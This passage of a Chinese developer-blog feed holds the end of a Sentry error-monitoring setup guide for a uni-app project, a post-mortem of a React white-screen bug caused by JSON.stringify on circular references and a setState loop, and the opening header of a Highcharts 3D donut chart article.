<p>在用户登录或获取用户信息后，自动设置 Sentry 用户信息：</p>
<h5 data-id="heading-26">1. App.vue 中初始化时设置</h5>
<pre><code class="hljs language-105:110:src/App.vue" lang="105:110:src/App.vue">    // 设置 Sentry 用户信息
    const userStore = useUserStore()
    const { userId, username } = userStore.userInfo || {}
    if (userId &amp;&amp; username) {
      setSentryUser({ id: userId, username })
    }
</code></pre>
<h5 data-id="heading-27">2. User Store 中设置</h5>
<p>在 <code>src/stores/user.ts</code> 中，设置用户信息时自动关联 Sentry：</p>
<pre><code class="hljs language-23:32:src/stores/user.ts" lang="23:32:src/stores/user.ts">    const setUserInfo = (val: UserModel) =&gt; {
      userInfo.value = val
      // 设置 Sentry 用户信息
      if (val.userId &amp;&amp; val.username) {
        setSentryUser({
          id: val.userId,
          username: val.username,
        })
      }
    }
</code></pre>
<h5 data-id="heading-28">3. 清除用户信息</h5>
<p>登出时清除 Sentry 用户信息：</p>
<pre><code class="hljs language-44:51:src/stores/user.ts" lang="44:51:src/stores/user.ts">    const clearAll = () =&gt; {
      userInfo.value = { ...initState }
      companyInfo.value = {}
      realNameInfo.value = {}
      hasCompanyList.value = false
      // 清除 Sentry 用户信息
      setSentryUser()
    }
</code></pre>
<hr/>
<h3 data-id="heading-29">平台差异说明</h3>
<h4 data-id="heading-30">APP 平台特殊配置</h4>
<p>APP 平台（Android/iOS）需要在初始化时禁用某些钩子，避免与 <code>App.onError</code> 冲突：</p>
<pre><code class="hljs language-31:44:src/sentry.ts" lang="31:44:src/sentry.ts">  const isAppPlatform =
    String(__UNI_PLATFORM__) === 'app' || String(__UNI_PLATFORM__) === 'app-harmony'

  Sentry.init({
    dsn: VITE_SENTRY_DSN,
    // extraOptions 主要是解决平台差异问题的
    // 非 APP 平台，可以不使用
    extraOptions: isAppPlatform
      ? {
          onmemorywarning: false,
          onerror: false,
        }
      : undefined,
  })
</code></pre>
<p><strong>原因</strong>：</p>
<ul>
<li><code>uni.onError</code> 在 APP 平台不支持</li>
<li>需要在 <code>App.onError</code> 中手动捕获错误</li>
<li>因此需要禁用 Sentry 内部的 <code>onerror</code> 钩子</li>
</ul>
<h4 data-id="heading-31">平台支持情况</h4>
<p>参考 <a href="https://link.juejin.cn?target=https%3A%2F%2Funiapp.dcloud.net.cn%2Fapi%2Fapplication.html%23onerror" target="_blank" title="https://uniapp.dcloud.net.cn/api/application.html#onerror" ref="nofollow noopener noreferrer">uni-app 官方文档</a>：</p>
<ul>
<li>✅ H5: 支持 <code>uni.onError</code></li>
<li>✅ 小程序: 支持 <code>uni.onError</code></li>
<li>❌ APP: 不支持 <code>uni.onError</code>，需要使用 <code>App.onError</code></li>
</ul>
<hr/>
<h3 data-id="heading-32">总结</h3>
<h4 data-id="heading-33">配置检查清单</h4>
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 在 <code>.env</code> 文件中配置 <code>VITE_SENTRY_DSN</code></li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 在 <code>env-conf.ts</code> 中配置各环境的 <code>SENTRY_ENABLE</code></li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 确保 <code>src/App.vue</code> 中调用了 <code>initSentry()</code></li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 确保 <code>src/App.vue</code> 中配置了 <code>onError</code> 钩子</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 确保用户登录后调用了 <code>setSentryUser()</code></li>
</ul>
<h4 data-id="heading-34">最佳实践</h4>
<ol>
<li>
<p><strong>异常 vs 业务错误</strong>：</p>
<ul>
<li>真正的异常（网络错误、代码错误）使用 <code>captureException</code></li>
<li>业务逻辑错误（错误码）使用 <code>captureMessage</code></li>
</ul>
</li>
<li>
<p><strong>用户信息关联</strong>：</p>
<ul>
<li>登录后立即设置用户信息</li>
<li>登出时清除用户信息</li>
</ul>
</li>
<li>
<p><strong>额外信息</strong>：</p>
<ul>
<li>上报时尽量提供上下文信息（URL、参数、traceId 等）</li>
<li>便于在 Sentry 后台快速定位问题</li>
</ul>
</li>
<li>
<p><strong>环境控制</strong>：</p>
<ul>
<li>开发环境可以启用，方便调试</li>
<li>测试环境建议关闭，避免测试数据污染</li>
<li>生产环境必须启用，用于监控线上问题</li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-35">相关文件清单</h3>
<ul>
<li><code>src/sentry.ts</code> - Sentry 核心配置和工具函数</li>
<li><code>src/App.vue</code> - Sentry 初始化和全局错误捕获</li>
<li><code>src/service/index.ts</code> - HTTP 请求错误上报</li>
<li><code>src/stores/user.ts</code> - 用户信息关联</li>
<li><code>env-conf.ts</code> - 环境配置（Sentry 开关）</li>
<li><code>typings/env.d.ts</code> - 环境变量类型定义</li>
<li><code>package.json</code> - 依赖包配置</li>
</ul>
<hr/>
<p><strong>文档更新时间</strong>: 2025-01-24</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React 项目诡异白屏事故复盘：JSON.stringify、循环引用、setState 死循环，一个都没跑]]></title>    <link>https://juejin.cn/post/7575469988738007049</link>    <guid>https://juejin.cn/post/7575469988738007049</guid>    <pubDate>2025-11-24T03:41:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575469988738007049" data-draft-id="7575412016405397514" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React 项目诡异白屏事故复盘：JSON.stringify、循环引用、setState 死循环，一个都没跑"/> <meta itemprop="keywords" content="前端,Debug"/> <meta itemprop="datePublished" content="2025-11-24T03:41:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="vim怎么退出"/> <meta itemprop="url" content="https://juejin.cn/user/3408900584639341"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React 项目诡异白屏事故复盘：JSON.stringify、循环引用、setState 死循环，一个都没跑
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3408900584639341/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    vim怎么退出
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:41:54.000Z" title="Mon Nov 24 2025 03:41:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333;position:relative;background-image:linear-gradient(90deg,rgba(217,234,251,.25) 3%,transparent 0),linear-gradient(1turn,rgba(217,234,251,.25) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;padding-left:8px;padding-bottom:0;margin-top:35px;margin-bottom:10px;font-weight:900;font-family:serif;letter-spacing:1px;color:#000}.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover{background-color:#fff}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{font-size:24px;position:relative}.markdown-body h2:after{content:"";left:0;bottom:0;width:100%;height:1px;position:absolute}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{height:1px;border:none;margin-top:32px;margin-bottom:32px;background-size:4px 1px;background-image:linear-gradient(270deg,#37b2ff 0,#37b2ff 25%,transparent 50%)}.markdown-body code{margin:0 4px;word-break:break-word;overflow-x:auto;background-color:#fff7f7;color:#f06;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:-apple-system,system-ui,Menlo,Monaco,Consolas,Courier New;position:relative}.markdown-body pre{margin:15px 8px;border:1px solid #f5f5f7;line-height:1.75}.markdown-body pre:before{top:-4px;left:-4px;border-top:8px solid #feea1e;border-left:8px solid #feea1e}.markdown-body pre:after,.markdown-body pre:before{width:20px;height:20px;content:"";z-index:10;position:absolute}.markdown-body pre:after{right:-4px;bottom:-4px;border-right:8px solid #37b2ff;border-bottom:8px solid #37b2ff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;overflow-x:auto;margin:0;word-break:normal;display:block;color:#333;background-color:#fff;position:unset!important}.markdown-body pre:nth-child(odd):before{border-top-color:#a7ecad;border-left-color:#a7ecad}.markdown-body pre:nth-child(odd):after{border-right-color:#e699e6;border-bottom-color:#e699e6}.markdown-body a{margin:0 4px;text-decoration:none;color:#37b2ff;transition:.3s;display:inline-block;vertical-align:bottom;position:relative}.markdown-body a:before{content:"READ MORE +";bottom:90%;width:120px;max-width:0;color:#fff;background-color:#1fb3ff;position:absolute;white-space:nowrap;transition:.3s;box-sizing:border-box;pointer-events:none;overflow:hidden}.markdown-body a:after{content:"";bottom:0;left:0;width:100%;height:1px;border-bottom:1px dashed #37b2ff;position:absolute}.markdown-body a:active:before,.markdown-body a:hover:before{max-width:120px;padding-left:14px}.markdown-body table{width:100%;max-width:100%;font-size:12px;background-color:#fff;overflow:auto;border-collapse:collapse}.markdown-body table tr:hover td,.markdown-body table tr:hover th{border-bottom:1px solid #feea1e}.markdown-body thead{text-align:left}.markdown-body th{font-size:1.2em;border-bottom:1px dashed #eee}.markdown-body tr:nth-child(2n){background-color:hsla(0,0%,87.8%,.1);border-bottom:1px solid #fff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px;border-bottom:1px dashed #fff}.markdown-body blockquote{color:#666;padding:12px 23px 2px;border:1px solid #37b2ff;background-color:#fff;margin:22px 0;position:relative}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body blockquote:after{content:"FROM";left:0;width:40px;color:#fff;background-color:#37b2ff;text-align:center}.markdown-body blockquote:after,.markdown-body blockquote:before{top:0;line-height:1;padding:2px 0;font-size:12px;font-weight:lighter;position:absolute;pointer-events:none}.markdown-body blockquote:before{content:"CITATION";left:44px;color:#37b2ff}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{line-height:2em;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#37b2ff}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol ol li,.markdown-body ol ul li,.markdown-body ul ol li,.markdown-body ul ul li{border-bottom:none}.markdown-body ol li{padding-left:6px;list-style:decimal-leading-zero}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]{position:relative}.markdown-body input[type=checkbox]:before{top:0;left:0;right:0;bottom:0;content:"";width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1;position:absolute}.markdown-body input[type=checkbox]:checked:after{content:"";top:10%;left:18%;width:90%;height:40%;border-left:2px solid #37b2ff;border-bottom:2px solid #37b2ff;color:#37b2ff;z-index:2;transform:rotate(-45deg);position:absolute}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-light">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#383a42;background:#fafafa}.hljs-comment,.hljs-quote{color:#a0a1a7;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#a626a4}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e45649}.hljs-literal{color:#0184bb}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#50a14f}.hljs-built_in,.hljs-class .hljs-title{color:#c18401}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#986801}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#4078f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h2 data-id="heading-0"><strong>一、背景：某核心模块突然白屏</strong></h2>
<p>前两周某私有云客户反馈一个关键业务页面 <strong>突然白屏</strong>，刷新浏览器会好，但是经常复现，极其影响用户操作和体验。</p>
<p>由于是私有云，并且我公有云复现不出来，于是找到用户远程看问题。</p>
<p>打开控制台一看，迎面就是一串熟悉又危险的错误：</p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-type">TypeError</span>: <span class="hljs-type">Converting</span> circular structure to <span class="hljs-type">JSON</span>
    --&gt; starting at <span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-keyword">with</span> <span class="hljs-title">constructor</span> '<span class="hljs-title">Object</span>'</span>
    --- property 'xxxx' closes the circle
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6270a552e6a64b9caeb1c56b5c591634~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdmlt5oCO5LmI6YCA5Ye6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560514&amp;x-signature=zz36j0rvtEGl9cm6jckwczcamUY%3D" alt="image.png" loading="lazy"/></p>
<p>这意味着 ——<br/>
<strong>某处代码正在用 JSON.stringify 序列化一个包含循环引用的数据结构。</strong></p>
<p>问题立刻严重起来：</p>
<ul>
<li>循环引用导致 JSON.stringify 崩溃</li>
<li>这个崩溃发生在 React 生命周期</li>
<li>生命周期抛错时整个 UI 树会 unmount → 直接白屏</li>
</ul>
<p>这是典型的 <strong>现网级事故</strong>。</p>
<hr/>
<h2 data-id="heading-1"><strong>二、初次定位与修复：错误指向 componentDidUpdate</strong></h2>
<p>进一步追踪堆栈，定位到某个类组件的 <code>componentDidUpdate</code> ，然后我查看源码：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">componentDidUpdate</span>(<span class="hljs-params">prevProps, prevState</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(xxx) !== <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(xxx) || ...) {
}
</code></pre>
<p>心想一定是这里出了问题，因为堆栈原因说的很清楚了，于是开始着手修改代码。</p>
<p>改完发现不是私有云分支，于是切换到私有云分支之后发现，<code>JSON.stringfy()</code>已经被替换成 <code>lodash.isEqual()</code> ，但是公有云没有下沉。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">componentDidUpdate</span>(<span class="hljs-params">prevProps, prevState</span>) {
    <span class="hljs-keyword">if</span> (!_.<span class="hljs-title function_">isEqual</span>(
      xxx.<span class="hljs-property">tool</span>.<span class="hljs-title function_">copyObj</span>(...), 
      xxx.<span class="hljs-property">tool</span>.<span class="hljs-title function_">copyObj</span>(...)
    )) {
        xxx
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(xxx);
    }
}
</code></pre>
<p>逻辑没有变化：</p>
<ul>
<li>比较 props 是否变化</li>
<li>变化后 setState 触发渲染</li>
</ul>
<p>我看问题已经被修复，于是询问了客户版本，原来是还没有升级最新补丁，于是帮助她升级补丁，验证后无问题。</p>
<hr/>
<h2 data-id="heading-2"><strong>三、第二次复现：isEqual 被编译成了 JSON.stringify</strong></h2>
<p>周一一大早用户发消息说又复现了白屏问题，然后我再次远程，查看 <code>webpack</code> 编译后的 <code>bundle</code> 时，发现真正运行的代码竟然是：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">if</span> (<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(O.<span class="hljs-property">tool</span>.<span class="hljs-title function_">copyObj</span>(...)) !== <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(O.<span class="hljs-property">tool</span>.<span class="hljs-title function_">copyObj</span>(...))) {
    ...
}
</code></pre>
<p><strong>打包后，lodash 的 isEqual 被直接替换成了 JSON.stringify 的结果对比。</strong></p>
<p>而此时报错依然是 <code>TypeError: Converting circular structure to JSON</code>。</p>
<p>此时怀疑是不是代码不对，对比 <code>commitId</code> 发现代码确实是最新的，说明经过 <code>webpack</code> 打包替换了， <code>isEqual</code> 被 <code>tree-shaking</code> 干掉了，构建器认为 <code>stringify</code> 足够。</p>
<p>但确实是还是报循环引用的错误，于是我使用 Chrome 的 Overrides 来修改现网源码去验证错误。</p>
<hr/>
<h2 data-id="heading-3"><strong>四、我利用 Chrome Overrides 热补丁修复：但又碰到了 React #185 错误</strong></h2>
<p>我做了个实验，把现网代码临时替换为：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">if</span> ((O.<span class="hljs-property">tool</span>.<span class="hljs-title function_">copyObj</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>)) !== (O.<span class="hljs-property">tool</span>.<span class="hljs-title function_">copyObj</span>(prevProps))) {
</code></pre>
<p>不再 stringify 和深比较。</p>
<p>结果报错变成：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">React</span> <span class="hljs-title class_">Error</span> #<span class="hljs-number">185</span>:
<span class="hljs-title function_">setState</span>(...): <span class="hljs-title class_">Cannot</span> update a component <span class="hljs-keyword">from</span> inside the <span class="hljs-keyword">function</span> body...
</code></pre>
<p>这说明：</p>
<h3 data-id="heading-4">🚨 <strong>componentDidUpdate 里的 setState 引发了新的死循环。</strong></h3>
<p>因为 shallow compare 仍然总是 false → 永远进入 setState → 无限循环。</p>
<p>然后我将代码里的 <code>setState</code> 给注释掉。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">if</span> ((O.<span class="hljs-property">tool</span>.<span class="hljs-title function_">copyObj</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>)) !== (O.<span class="hljs-property">tool</span>.<span class="hljs-title function_">copyObj</span>(prevProps))) {
    <span class="hljs-comment">// this.setState(xxx);</span>
}
</code></pre>
<p><strong>页面终于正常了！！！</strong></p>
<hr/>
<h2 data-id="heading-5"><strong>五、为什么 copyObj 会制造循环？（关键根因）</strong></h2>
<p>项目自定义的 copyObj 代码：</p>
<pre><code class="hljs language-bash" lang="bash">cloneDeepWith(obj, value =&gt; {
  <span class="hljs-keyword">if</span> (value?.$<span class="hljs-variable">$typeof</span> || React.isValidElement(value)) {
    <span class="hljs-built_in">return</span> <span class="hljs-string">''</span>
  }
})
</code></pre>
<p>看似规避了 React element，<br/>
但 <strong>根本没有规避循环引用</strong>。</p>
<p>于是出现经典死亡链：</p>
<pre><code class="hljs language-matlab" lang="matlab">props → store → <span class="hljs-keyword">properties</span> → ... → props
</code></pre>
<p>cloneDeep 走到循环节点 →<br/>
lodash 在无法处理循环引用 →<br/>
JSON.stringify 再次遇到循环 → 崩</p>
<hr/>
<h2 data-id="heading-6"><strong>六、最终修复方案设计</strong></h2>
<h3 data-id="heading-7"><strong>修复目标</strong>：</h3>
<ol>
<li>不使用 JSON.stringify</li>
<li>不深度比较 props</li>
<li>避免所有 setState 死循环</li>
<li>可在现网用 overrides 修热补丁</li>
<li>不破坏现有业务逻辑</li>
</ol>
<hr/>
<h3 data-id="heading-8"><strong>🔥 我让GPT设计的临时安全方案</strong></h3>
<p>在 componentDidUpdate 内联一个：</p>
<ul>
<li>safeCopy（带 WeakMap 防环）</li>
<li>isSame（浅比较）</li>
<li>严格 setState 条件判断</li>
</ul>
<p>核心代码结构如下：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">safeCopy</span>(<span class="hljs-params">obj</span>) {
        <span class="hljs-keyword">const</span> seen = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">clone</span>(<span class="hljs-params">x</span>) {
            <span class="hljs-keyword">if</span> (x === <span class="hljs-literal">null</span> || <span class="hljs-keyword">typeof</span> x !== <span class="hljs-string">"object"</span>) <span class="hljs-keyword">return</span> x;

            <span class="hljs-keyword">if</span> (seen.<span class="hljs-title function_">has</span>(x)) <span class="hljs-keyword">return</span> seen.<span class="hljs-title function_">get</span>(x);

            <span class="hljs-keyword">if</span> (x.<span class="hljs-property">$$typeof</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;  

            <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(x) ? [] : {};
            seen.<span class="hljs-title function_">set</span>(x, result);

            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> x) {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">const</span> value = x[key];
                    result[key] = <span class="hljs-title function_">clone</span>(value);
                } <span class="hljs-keyword">catch</span> (err) {
                }
            }
            <span class="hljs-keyword">return</span> result;
        }
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">clone</span>(obj);
    }

    <span class="hljs-keyword">function</span> <span class="hljs-title function_">isSame</span>(<span class="hljs-params">a, b</span>) {
        <span class="hljs-keyword">if</span> (a === b) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">if</span> (!a || !b) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> k <span class="hljs-keyword">in</span> a) {
            <span class="hljs-keyword">if</span> (a[k] !== b[k]) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> k <span class="hljs-keyword">in</span> b) {
            <span class="hljs-keyword">if</span> (a[k] !== b[k]) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
</code></pre>
<p>示例，已在现网验证有效</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> a = <span class="hljs-title function_">safeCopy</span>(xxx);
<span class="hljs-keyword">const</span> b = <span class="hljs-title function_">safeCopy</span>(xxx);

<span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isSame</span>(a, b)) {
    <span class="hljs-keyword">const</span> nextValue = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">xxx</span>(...);
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">value</span> !== nextValue) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>({ <span class="hljs-attr">value</span>: nextValue });
    }
}
</code></pre>
<p>这同时避免了：</p>
<ul>
<li>任何形式的深比较</li>
<li>对 React element 的 clone</li>
<li>循环引用</li>
<li>setState 死循环</li>
</ul>
<hr/>
<h2 data-id="heading-9"><strong>七、总结</strong></h2>
<p>经过这次问题，知道了项目里还存在许多技术债，后续要继续优化。而私有云的定位比公有云比较复杂，后续要多多借助热补丁帮助定位并验证问题。</p>
<ol>
<li>Chrome Overrides 快速验证问题</li>
<li>代码后续重构</li>
<li>增加降级方案（后续优化）</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[使用Highcharts创建3D环形图]]></title>    <link>https://juejin.cn/post/7575937594351009835</link>    <guid>https://juejin.cn/post/7575937594351009835</guid>    <pubDate>2025-11-24T05:35:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575937594351009835" data-draft-id="7568769772507414568" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="使用Highcharts创建3D环形图"/> <meta itemprop="keywords" content="前端,ECharts"/> <meta itemprop="datePublished" content="2025-11-24T05:35:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Danny_FD"/> <meta itemprop="url" content="https://juejin.cn/user/1788247743933225"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            使用Highcharts创建3D环形图
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1788247743933225/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Danny_FD
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T05:35:29.000Z" title="Mon Nov 24 2025 05:35:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
